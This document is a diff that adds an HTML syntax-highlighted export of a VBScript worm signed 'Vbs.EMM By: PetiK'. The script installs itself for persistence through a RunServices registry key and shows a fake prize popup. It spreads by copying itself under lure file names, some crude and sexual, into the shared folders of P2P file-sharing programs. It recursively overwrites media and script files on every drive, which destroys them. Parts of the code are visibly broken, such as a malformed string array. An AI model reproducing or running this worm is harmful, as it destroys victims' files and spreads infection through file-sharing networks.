@@ -1,0 +1,127 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+.sc9 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'kpwg 1.4
+'Vbs.EMM By: PetiK
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">shell</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">createobject</span><span class="sc6">(</span><span class="sc4">"wscript.shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">createobject</span><span class="sc6">(</span><span class="sc4">"scripting.filesystemobject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">EMM</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc0">
+</span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">EMM</span><span class="sc6">,</span><span class="sc7">fso.getspecialfolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\emm.vbs"</span><span class="sc0">
+</span><span class="sc7">shell.regwrite</span><span class="sc0"> </span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\emm"</span><span class="sc6">,</span><span class="sc7">fso.getspecialfolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)&amp;</span><span class="sc0"> </span><span class="sc4">"\emm.vbs"</span><span class="sc0">
+</span><span class="sc7">Pgdir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">shell.regread</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">day</span><span class="sc6">(</span><span class="sc7">now</span><span class="sc6">())</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Month</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">month</span><span class="sc6">(</span><span class="sc7">now</span><span class="sc6">())</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+ </span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"You just won a trip to France!"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbPicture</span><span class="sc6">,</span><span class="sc4">"http://Free-Trips.org"</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">myfile</span><span class="sc6">=</span><span class="sc7">fso.opentextfile</span><span class="sc6">(</span><span class="sc7">wscript.scriptfullname</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">src</span><span class="sc6">=</span><span class="sc7">myfile.readall</span><span class="sc0">
+</span><span class="sc7">myfile.close</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">drvs</span><span class="sc6">=</span><span class="sc7">fso.drives</span><span class="sc0"> 
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">drv</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">drvs</span><span class="sc0">
+ </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">drv.isready</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+  </span><span class="sc7">infect</span><span class="sc0"> </span><span class="sc7">drv</span><span class="sc0">
+ </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc7">files</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">array</span><span class="sc6">(</span><span class="sc4">"Young teen.jpg"</span><span class="sc6">,</span><span class="sc4">"Hot Girl.jpg"</span><span class="sc6">,</span><span class="sc4">"Pussy.jpg"</span><span class="sc6">,</span><span class="sc4">"sex.jpg"</span><span class="sc6">,</span><span class="sc4">"big boobs.jpg"</span><span class="sc6">,</span><span class="sc4">"Nice teens.jpg"</span><span class="sc6">,</span><span class="sc4">"School Reports.doc"</span><span class="sc6">,</span><span class="sc4">"Sex Tips.doc"</span><span class="sc6">,</span><span class="sc4">"Lord of the rings.doc"</span><span class="sc6">,</span><span class="sc4">"How To Rip DVDs.doc"</span><span class="sc6">,</span><span class="sc4">"Eminem - I need to be shot.mp3"</span><span class="sc6">,</span><span class="sc4">"Blink 182 - We Suck.mp3"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">kl</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Pgdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\kazaa lite\my shared folder"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">fso.folderexists</span><span class="sc6">(</span><span class="sc7">kl</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+ </span><span class="sc3">for</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">=</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
+  </span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">EMM</span><span class="sc6">,</span><span class="sc7">kl</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">files</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".vbs"</span><span class="sc0">
+ </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">kazaa</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Pgdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\kazaa\my shared folder"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">fso.folderexists</span><span class="sc6">(</span><span class="sc7">kazaa</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+ </span><span class="sc3">for</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">=</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
+  </span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">EMM</span><span class="sc6">,</span><span class="sc7">kl</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">files</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".vbs"</span><span class="sc0">
+ </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">kmd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Pgdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\kmd\my shared folder"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">fso.folderexists</span><span class="sc6">(</span><span class="sc7">kmd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+ </span><span class="sc3">for</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">=</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
+  </span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">EMM</span><span class="sc6">,</span><span class="sc7">kl</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">files</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".vbs"</span><span class="sc0">
+ </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">grokster</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Pgdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\grokster\my grokster"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">fso.folderexists</span><span class="sc6">(</span><span class="sc7">grokster</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+ </span><span class="sc3">for</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">=</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
+  </span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">EMM</span><span class="sc6">,</span><span class="sc7">kl</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">files</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".vbs"</span><span class="sc0">
+ </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">bearshare</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Pgdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\bearshare\shared"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">fso.folderexists</span><span class="sc6">(</span><span class="sc7">bearshare</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+ </span><span class="sc3">for</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">=</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
+  </span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">EMM</span><span class="sc6">,</span><span class="sc7">kl</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">files</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".vbs"</span><span class="sc0">
+ </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">edonkey</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Pgdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\edonkey2000\incoming"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">fso.folderexists</span><span class="sc6">(</span><span class="sc7">edonkey</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+ </span><span class="sc3">for</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">=</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
+  </span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">EMM</span><span class="sc6">,</span><span class="sc7">kl</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">files</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".vbs"</span><span class="sc0">
+ </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">morpheus</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Pgdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\morpheus\my shared folder"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">fso.folderexists</span><span class="sc6">(</span><span class="sc7">morpheus</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+ </span><span class="sc3">for</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">=</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
+  </span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">EMM</span><span class="sc6">,</span><span class="sc7">kl</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">files</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".vbs"</span><span class="sc0">
+ </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">limewire</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Pgdir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\limewire\shared"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">fso.folderexists</span><span class="sc6">(</span><span class="sc7">limewire</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+ </span><span class="sc3">for</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">=</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
+  </span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">EMM</span><span class="sc6">,</span><span class="sc7">kl</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">files</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".vbs"</span><span class="sc0">
+ </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">function</span><span class="sc0"> </span><span class="sc7">infect</span><span class="sc6">(</span><span class="sc7">Path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">folder</span><span class="sc6">=</span><span class="sc7">fso.getfolder</span><span class="sc6">(</span><span class="sc7">path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">files</span><span class="sc6">=</span><span class="sc7">folder.files</span><span class="sc0">
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">file</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">files</span><span class="sc0">
+ </span><span class="sc7">fs</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">array</span><span class="sc6">(</span><span class="sc4">"vbs,"</span><span class="sc7">vbe</span><span class="sc4">","</span><span class="sc7">jpg</span><span class="sc4">","</span><span class="sc7">avi</span><span class="sc4">","</span><span class="sc7">mpg</span><span class="sc9">")
+</span><span class="sc0"> </span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">fs</span><span class="sc0">
+  </span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc7">lcase</span><span class="sc6">(</span><span class="sc7">fso.getextensionname</span><span class="sc6">(</span><span class="sc7">file</span><span class="sc6">))</span><span class="sc0">
+  </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc7">f</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+   </span><span class="sc7">fso.deletefile</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">file</span><span class="sc6">)</span><span class="sc0">
+   </span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">file</span><span class="sc0">
+  </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+ </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">sfolder</span><span class="sc6">=</span><span class="sc7">folder.subfolders</span><span class="sc0">
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">sfolder</span><span class="sc0">
+ </span><span class="sc7">infect</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">function</span><span class="sc0">
+</span><span class="sc1">rem kpwg 1.4
+</span></div></body>
+</html>
